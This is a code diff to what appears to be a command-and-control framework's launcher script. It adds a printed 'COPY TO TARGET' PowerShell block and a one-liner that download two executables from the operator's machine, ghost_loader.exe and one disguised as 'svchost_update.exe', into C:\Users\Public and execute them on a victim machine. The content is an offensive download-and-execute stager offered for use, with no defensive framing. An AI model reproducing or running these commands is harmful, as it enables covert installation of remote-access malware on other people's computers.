@@ -594,8 +594,16 @@ def _phase0_launch():
         print(f"  {AMBER}[!]{RST}  Port 8890 already in use — file server running elsewhere")
 
     print(f"  {GREEN}[OK]{RST} C2 listener: 0.0.0.0:4443")
-    print(f"  {DIM}     Physical access: drop + run shell/ghost_loader.exe on target{RST}")
-    print(f"  {DIM}     Remote: iwr http://{my_ip}:8890/shell/ghost_loader.exe -OutFile C:\\Users\\Public\\g.exe; Start-Process C:\\Users\\Public\\g.exe{RST}")
+    print()
+    print(f"  {RED}{BOLD}  ┌─ COPY TO TARGET (PowerShell) ──────────────────────────────────────┐{RST}")
+    print(f"  {WHITE}  $ip=\"{my_ip}\"{RST}")
+    print(f"  {WHITE}  iwr \"http://$ip:8890/shell/ghost_loader.exe\" -OutFile \"C:\\Users\\Public\\g.exe\"{RST}")
+    print(f"  {WHITE}  iwr \"http://$ip:8890/agent/svchost_update.exe\" -OutFile \"C:\\Users\\Public\\s.exe\"{RST}")
+    print(f"  {WHITE}  Start-Process \"C:\\Users\\Public\\g.exe\"{RST}")
+    print(f"  {WHITE}  Start-Process \"C:\\Users\\Public\\s.exe\"{RST}")
+    print(f"  {RED}{BOLD}  └────────────────────────────────────────────────────────────────────┘{RST}")
+    print()
+    print(f"  {DIM}  One-liner: $ip=\"{my_ip}\"; iwr \"http://$ip:8890/shell/ghost_loader.exe\" -OutFile \"C:\\Users\\Public\\g.exe\"; iwr \"http://$ip:8890/agent/svchost_update.exe\" -OutFile \"C:\\Users\\Public\\s.exe\"; Start-Process \"C:\\Users\\Public\\g.exe\"; Start-Process \"C:\\Users\\Public\\s.exe\"{RST}")
     print()
 
     c2_v2 = os.path.join(ROOT, "shell", "vader_c2_v2.py")
